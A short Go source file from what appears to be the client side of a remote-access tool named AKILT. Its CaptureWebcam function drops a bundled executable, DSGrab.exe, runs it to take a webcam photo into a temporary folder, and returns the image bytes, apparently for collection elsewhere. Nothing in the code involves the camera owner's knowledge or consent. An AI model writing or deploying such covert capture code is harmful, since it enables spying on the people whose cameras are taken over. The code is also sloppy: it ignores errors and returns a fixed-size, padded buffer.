package webcam

import (
	"log"
	"os"
	"os/exec"

	"github.com/Xart3mis/AKILT/Client/lib/bundles"
)

func CaptureWebcam() []byte {
	bundles.WriteDSGrab()
	f, err := os.MkdirTemp("", "Pic_dir-")

	if err != nil {
		log.Println(err)
	}

	path := f + "\\Temp_Pic.jpg"

	exec.Command("./DSGrab.exe", path).Run()

	file, err := os.OpenFile(path, os.O_RDONLY, 0644)
	if err != nil {
		log.Println(err)
	}

	var b []byte = make([]byte, 6000000)
	file.Read(b)

	return b
}
